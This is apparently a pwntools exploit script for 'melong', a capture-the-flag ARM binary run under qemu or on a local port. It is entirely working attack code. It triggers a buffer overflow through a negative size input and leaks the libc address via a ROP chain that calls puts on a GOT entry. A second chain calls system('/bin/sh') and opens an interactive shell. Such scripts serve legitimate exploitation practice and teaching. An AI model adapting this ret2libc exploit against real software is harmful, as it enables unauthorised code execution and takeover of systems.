#!/usr/bin/env python
# -*- coding: utf-8 -*-

from pwn import *
from time import sleep
import sys
context.binary = "./melong"

if sys.argv[1] == "r":
    io = remote("localhost", 9999)
elif sys.argv[1] == "l":
    io = process(["qemu-arm", "-L", "./", "./melong"])
else:
    io = process(["qemu-arm", "-g", "1234", "-L", "./", "./melong"])

elf = ELF("./melong", checksec = False)
libc = ELF("./lib/libc.so.6", checksec = False)
context.log_level = "debug"

def check(height, weight):
    io.sendlineafter(":", "1")
    io.sendlineafter(" : ", str(height))
    io.sendlineafter(" : ", str(weight))

def PT(size):
    io.sendlineafter(":", "3")
    io.sendlineafter("?\n", str(size))

def write_diray(payload):
    io.sendlineafter(":", "4")
    io.send(payload)

def logout():
    io.sendlineafter(":", "6")

if __name__ == "__main__":
    check(1.82, 60)
    PT(-1)
    '''
    0x00011bbc : pop {r0, pc}
    '''
    pr0 = 0x00011bbc
    leak  = flat(cyclic(0x54), pr0, elf.got['puts'], elf.plt['puts'])
    leak += flat(elf.sym['main']) * 8
    write_diray(leak)
    logout()
    io.recvuntil("See you again :)\n")
    libc.address = u32(io.recvn(4)) - libc.sym['puts']
    success("libc.address -> {:#x}".format(libc.address))
    #  raw_input("DEBUG: ")

    check(1.82, 60)
    PT(-1)
    rop = cyclic(0x54) + p32(pr0) + p32(next(libc.search("/bin/sh"))) + p32(libc.sym['system'])
    write_diray(rop)
    logout()

    io.interactive()


